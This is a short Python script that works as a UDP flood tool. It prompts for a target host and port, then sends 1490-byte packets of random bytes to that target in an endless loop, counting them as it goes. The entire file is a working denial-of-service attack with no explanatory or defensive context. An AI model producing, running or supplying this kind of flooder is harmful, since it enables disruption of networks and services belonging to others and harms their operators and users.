import socket
import random

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

host = input('target: ')
port = int(input('port: '))

i = 0
while True:
    s.sendto(random._urandom(1490), (host, port))
    print(f'[*]Forced {i} packets on {host}')
    i += 1
